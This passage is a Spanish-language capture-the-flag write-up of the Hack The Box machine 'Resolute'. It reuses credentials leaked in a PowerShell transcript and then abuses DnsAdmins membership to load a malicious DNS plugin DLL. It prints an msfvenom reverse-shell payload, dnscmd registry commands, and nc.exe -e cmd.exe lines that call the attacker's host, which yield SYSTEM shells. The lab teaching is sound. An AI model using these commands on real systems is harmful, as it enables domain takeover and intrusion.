PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4c123!
...
...
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4c123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+ FullyQualifiedErrorId : NativeCommandError
...
...
**********************
Windows PowerShell transcript start
...
...
```

Es un archivo que uso `Ryan` para registrar todo lo que escribía mientras efectuaba el mapeado del directorio `\\fs01\backups` en `X:`, hay dos cosas interesantes, que escribió mal el comando (aunque lo hubiera ejecutado bien también tendríamos lo otro curioso 😏) y que uso sus credenciales así como si nada y pues nos dejó un historial to lindo.

* [Registrar a fichero de log la línea de comandos de PowerShell (Transcript en PowerShell)](https://www.eltallerdesharepoint.com/net/registrar-a-fichero-de-log-la-linea-de-comandos-de-powershell-transcript-en-powershell/).

Sabemos que `Ryan` es un usuario del `AD, pero no si también existe en el sistema, validemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_melanieSH_dirUsers_RYANfound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, si existe, entonces probemos a obtener una nueva **PowerShell** pero ahora como él:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_evilWinRM_ryanSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OJITO, tamos dentro del sistema pero ahora como el usuario `Ryan` (:

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

En su escritorio hay una nota:

```powershell
*Evil-WinRM* PS C:\\Users\ryan\Desktop> type note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

Jmmmm... Podemos interpretarlo como un ¿backup?, que da igual si cambiamos algo, ¿en un minuto volverá a quedar como antes? Investiguemos...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_gif_computerANDfireALLfine.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Después de un tiempo perdido, volví atrás y con un simple comando ya nos encaminamos:

```powershell
*Evil-WinRM* PS C:\> whoami /all
...
...
GROUP INFORMATION
-----------------

Group Name             Type    SID                                            Attributes
====================== ======= ============================================== ===============================================================
...
MEGABANK\Contractors   Group   S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins     Alias   S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
...
```

Vemos que estamos en dos grupos distintos a los normales, uno de ellos con un nombre llamativo: `DnsAdmins`, si buscamos info sobre él en internet lo primero que encontramos son formas de escalar privilegios usándolo 😮

* [Feature, not bug: DNSAdmin to DC compromise in one line](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83).
* [DNS Admin Privesc in Active Directory (AD)(Windows)](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2).
* [Windows Privilege Escalation: DnsAdmins to DomainAdmin](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/).
* [From DnsAdmins to SYSTEM to Domain Compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise).

Antes de explotar esta locura, recorramos un poco el "porque" del ataque...

Según [Shay Ber](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83) por default los controladores de dominio (DC) también son servidores **DNS**, el tema es que eso expone al **DC** a ataques relacionados con servidores **DNS** :O

Únicamente los usuarios que estén en los grupos ***DnsAdmins, Domain Admins, Enterprise Admins, Administrators and ENTERPRISE DOMAIN CONTROLLERS*** tienen acceso al control/mantenimiento/gestion/actualización de un servidor **DNS** (que como dijimos antes, usualmente son **DC**s). Una vez dentro se pueden administrar zonas del **DNS**, redireccionamiento de puertos, logs, temas de la caché, objetos del servidor y de registros (etc.). Este último es interesante, ya que podemos escribir información adicional en el servidor **DNS** (:

Listones, nosotros estamos en uno de esos grupos, específicamente en `DnsAdmins`. Entonces para lograr la explotación debemos, cargar una **DLL** (librería dinámica) maliciosa en el servidor **DNS** (que esta siendo ejecutado como **SYSTEM, ya que por lo general el servidor es un **DC**).

💌 ***"Las `DLL (Dynamic Link Library)`, son fragmentos de código que se cargan bajo demanda por parte del sistema operativo durante la ejecución de una aplicación."*** [elladodelmal](https://www.elladodelmal.com/2020/07/dll-injection-como-hacer-hacking-en.html).

O sea, librerías que tiene por default (o no 😈) el sistema y son necesarias para ejecutar una aplicación.

En términos generales hay dos maneras de generar la ***DLL maliciosa***, una es con ayuda de `msfvenom` y la otra es construir nosotros mismos las instrucciones de la **DLL**, vamos a hacerlo de las dos maneras, pero dejaremos la creación manual de la **DLL** como aprendizaje para el final...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_gif_computertrash.gif" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
  
Así que juguemos con `msfvenom`...

...

Los pasos necesarios para la explotación son estos (siguiendo [este](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2) y [este post](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)):

<span style="color: yellow;">1. </span>Generamos la **DLL** maliciosa con `msfvenom`:

```bash
❱ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4433 -f dll -o sisisi.dll
❱ file sisisi.dll 
sisisi.dll: PE32+ executable (DLL) (GUI) x86-64, for MS Windows
```

<span style="color: yellow;">2. </span>Nos ponemos en escucha por **netcat** (para recibir la petición que hace la DLL y generar la Shell):

```bash
❱ nc -lvp 4433
```

<span style="color: yellow;">3. </span>Compartimos una carpeta donde esté la DLL generada, esto con ayuda de **SMB** (o **responder**):

```bash
❱ smbserver.py smbFolder $(pwd) -smb2support
```

La carpeta se llama `smbFolder`, le pasamos la ruta actual (el resultado del comando `pwd`) y le damos soporte a la versión 2 de samba.

<span style="color: yellow;">4. </span>Ahora agregamos la **DLL** al servicio **DNS**:

Validamos antes como esta el registro (se acuerdan lo que hablamos antes de que podíamos escribir cositas, entre ellas registros :P) que modificaremos:

```powershell
*Evil-WinRM* PS C:\> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

```powershell
*Evil-WinRM* PS C:\> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
Property ServerLevelPluginDll does not exist at path HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\.
...
```

Exacto, aún no lo hemos creado :P

Lo creamos diciendo que la **DLL** a agregar esta siendo compartida en una carpeta de **SMB**:

(*También podríamos subir la **DLL** al sistema y en vez de la carpeta compartida pasarle la ruta absoluta hacia ella*)

```powershell
*Evil-WinRM* PS C:\> dnscmd /config /serverlevelplugindll \\10.10.14.8\smbFolder\sisisi.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Y si ahora validamos la existencia del registro:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_ryanSH_registryDNSexists.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ya existe, peeeeerfectisimo. 

Como último paso debemos "reiniciar" el servicio **DNS** para que tome los cambios. Ejecutara el servidor **DNS**, leerá los registros relacionados, tomara el que llama la **DLL** y por lo tanto la ejecutara (:

<span style="color: yellow;">5. </span>Reiniciamos el servidor **DNS** para que ejecute nuestra **DLL**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_ryanSH_StopStartDNS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Una vez iniciamos el servidor **DNS** nos llega la petición a nuestra carpeta compartida buscando la **DLL**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_smbserver_requestsDLL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si esperamos un rato pensaremos que no funciono, peeeeeeeero esperamos un ratico más yyyyyyyyyyy...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_SYSTEMrevSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERO CLARO QUE SIIIIIIIII, obtenemos nuestra **Reverse Shell** como el usuario `nt authority\system` (diosito) del sistema (: veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y listos, eso ha sido todo por esta máquina ✈️ Si quieres ver como generar la **DLL** manualmente sigue conmigo e.e

...

# Post-PrivEsc: Creamos <u>DLL</u> manualmente [#](#manual-dll) {#manual-dll}

Buscando en internet `example dll dns github` encontramos 2 llamativos:

1. [https://github.com/dim0x69/dns-exe-persistance](https://github.com/dim0x69/dns-exe-persistance).
2. [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL).

Usaremos los dos para lograr la ejecución de comandos:

🅰 [Escalada generando **DLL** con **dns-exe-persistance**](#repo-dns-exe-persistance).<br>
🅱️ [Escalada generando **DLL** con **DNSAdmin-DLL**](#repo-dnsadmin-dll).

...

## Generamos la <u>DLL</u> usando <u>dns-exe-persistance</u> [📌](#repo-dns-exe-persistance) {#repo-dns-exe-persistance}

▶️ [https://github.com/dim0x69/dns-exe-persistance](https://github.com/dim0x69/dns-exe-persistance).

Revisando los post que hemos usado vemos que el siguiente tiene una estructura prácticamente igual al objeto `Win32Project1.cpp` del **primer recurso**, por lo que podemos pensar que o lo hizo él o se guio de ahí (o viceversa, el del repo se guio del post, no lo sabemos):

* [From DnsAdmins to SYSTEM to Domain Compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise).

Nos centraremos en el **primer recurso**, después será más rápido usar el **segundo**...

La estructura base del `DLL` (creo que de cualquier DLL) es esta (exactamente igual en los dos proyectos de arriba):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_git_structureDLL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, la parte que nos interesa (y con la que juega el creador del post) es la que esta en al archivo `Win32Project1.cpp`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_git_structureDLL_PluginDNS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si nos fijamos la primera función se llama `DnsPluginInitialize`, lo que nos puede indicar que eso es lo que se ejecutara una vez el plugin sea iniciado, por lo queeeeeee ahí debe ir nuestra matralla. El post con el que venimos trabajando y [este](https://vbscrub.com/2020/01/11/dns-server-plugin-dll-implementation-dnsplugininitialize-etc/) nos lo confirman.

Listooos, apoyados de nuevo en el post vemos que implementa en esa función la instrucción `system()` para que le ejecute el binario `shell.cmd` de la raíz (que puede contener ya sea una reverse shell o lo que sea).

Pues aprovechemos ese conocimiento para implementar en el archivo `Win32Project1.cpp` una línea con la función `system()`, pero como prueba que nos haga un `ping` hacia nuestra máquina, con lo cual si obtenemos la traza, sabemos que estamos ejecutando comandos en el sistema por medio de la `DLL`.

Nos movemos a una VM **Windows**, clonamos el repo, abrimos el objeto `Win32Project1.sln` (usaré [Visual Studio](https://visualstudio.microsoft.com/es/) para abrir el proyecto, modificarlo y compilarlo) y nos posicionamos en el archivo `Win32Project1.cpp`.

Ahora agregamos la línea con la instrucción `system()`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220win_VS_win32projCPP_systemPING.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lo siguiente será compilar el proyecto para que nos genere el archivo `.dll`. 

Arriba cambiamos `Debug` por `Release`, le decimos que la arquitectura es de `64 bits` y finalmente damos clic en `Compilar` y `Recompilar solución`:

```c++
1>Generando código
1>0 of 4 functions ( 0.0%) were compiled, the rest were copied from previous compilation.
1>  0 functions were new in current compilation
1>  0 functions had inline decision re-evaluated but remain unchanged
1>Generación de código finalizada
1>Win32Project1.vcxproj -> C:\dns-exe-persistance\dns-plugindll-vcpp\x64\Release\Win32Project1.dll
========== Compilar: 1 correctos, 0 incorrectos, 0 actualizados, 0 omitidos ==========
```

Peeerfecto, no hay errores y se nos generó el archivo `Win32Project1.dll`, así que lo siguiente es movernos la librería (`DLL`) a nuestro sistema para posteriormente jugar con **SMB**, `tcpdump` para estar escuchando por si llegan paquetes `ICMP` (recordemos que `ping` envía ese tipo de paquetes), **dnscmd** para agregar el plugin y el reinicio del servidor **DNS**:

Ejecutamos:

```bash
❱ file Win32Project1.dll 
Win32Project1.dll: PE32+ executable (DLL) (GUI) x86-64, for MS Windows
❱ smbserver.py smbFolder $(pwd) -smb2support
❱ tcpdump -i tun0 icmp
```

```powershell
*Evil-WinRM* PS C:\> dnscmd /config /serverlevelplugindll \\10.10.14.8\smbFolder\Win32Project1.dll
*Evil-WinRM* PS C:\> sc.exe stop dns
*Evil-WinRM* PS C:\> sc.exe start dns
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_tcpdump_ICMP_RCEdone.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

VAAAAAaaaaAAmo0000000000000oo nos llega la traza `ICMP`, por lo taaaaaaaaaaaaaaaaanto, el servidor **DNS** esta ejecutando nuestro plugin y por lo consiguiente nuestro plugin ejecuta el `ping` (((((:

AHORAAAAAAAAAA!! Digámosle que nos genere una **reverse Shell**, pero en lugar de pasarle el binario pasémosle un archivo `.bat` que será el que contenga toooooooodos los comandos que queremos ejecutar, en nuestro caso el llamado al `nc.exe` o a un binario generado con `msfvenom`.

El archivo `.cpp` quedaría así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220win_VS_win32projCPP_systemBAT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y en nuestro sistema creamos el objeto `hola.bat` con el llamado al binario `nc.exe` que también estaremos compartiendo en la misma carpeta `smbFolder`:

```bash
❱ cat hola.bat
\\10.10.14.8\smbFolder\nc.exe 10.10.14.8 4433 -e cmd.exe
```

Lo subimos a la máquina y nos ponemos en escucha:

```bash
❱ nc -lvp 4433
```

Hacemos todo lo de antes yyyyyyyyy en nuestro listeneeeeeeeeeeeeer:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_SYSTEMrevSH_dnsEXEpersistance.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Increibleeeeeeeeeeeeeee!! Cualquier comando que quisiéramos ejecutar lo pondríamos dentro de `hola.bat` y ya tendríamos RCE como diosito. Veamos rápidamente la otra manera...

...

## Generamos la <u>DLL</u> usando <u>DNSAdmin-DLL</u> [📌](#repo-dnsadmin-dll) {#repo-dnsadmin-dll}

▶️ [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL).

Este recurso es mucho más sencillo, él simplemente busca un archivo llamado `command.txt` en la ruta `C:\Windows\Temp`, parsea su información y cada línea la toma como comandos que serán ejecutados por la instrucción `system()`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220win_VS_DNSAdmin_DLL_commandTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Po listo, no tenemos que cambiar nada del proyecto, compilamos de la misma forma que antes y nos genera la librería `DNSAdmin-DLL.dll`.

```c++
1>------ Operación Recompilar todo iniciada: proyecto: DNSAdmin-DLL, configuración: Release x64 ------
1>stdafx.cpp
1>dllmain.cpp
1>DNSAdmin-DLL.cpp
1>   Creando biblioteca C:\DNSAdmin-DLL\DNSAdmin-DLL\x64\Release\DNSAdmin-DLL.lib y objeto C:\DNSAdmin-DLL\DNSAdmin-DLL\x64\Release\DNSAdmin-DLL.exp
1>Generando código
1>Previous IPDB not found, fall back to full compilation.
1>All 4 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
1>Generación de código finalizada
1>DNSAdmin-DLL.vcxproj -> C:\DNSAdmin-DLL\DNSAdmin-DLL\x64\Release\DNSAdmin-DLL.dll
========== Recompilar todo: 1 correctos, 0 incorrectos, 0 omitidos ==========
```

Generamos el archivo `command.txt` de nuevo con la reverse shell generada con **nc**, pero para cambiar, ponemos el puerto `4434` (a ver que e.e):

```bash
❱ cat command.txt 
\\10.10.14.8\smbFolder\nc.exe 10.10.14.8 4434 -e cmd.exe
```

Subimos a la ruta `C:\Windows\Temp` y nos ponemos en escucha por el puerto `4434`, ahora ejecutamos:

```powershell
*Evil-WinRM* PS C:\Windows\Temp> dnscmd /config /serverlevelplugindll \\10.10.14.8\smbFolder\DNSAdmin-DLL.dll
*Evil-WinRM* PS C:\Windows\Temp> sc.exe stop dns
*Evil-WinRM* PS C:\Windows\Temp> sc.exe start dns
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_SYSTEMrevSH_DNSAdminDLL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y LISTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_gif_girlPChappy.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

También obtenemos la reverse shell (: Así que tenemos 3 opciones, personalmente me gusta la segunda, ya que es muuuuuuuuuy sencilla de leer y saber que estamos haciendo.

Así que ahora si, nos vimoooooooooooooooooos...

...

¡Muy linda máquina eh! Me dan un poco de cosa los **DC**s, pero esta me quito muuuuuuuuuucho del "miedo" ante ellas, la escalada es brutal.

Bueeeeeno, hasta acá nos leemos 😥 cuídate y como sieeeempreeeeee: A R O M P E R T O D O ! ! !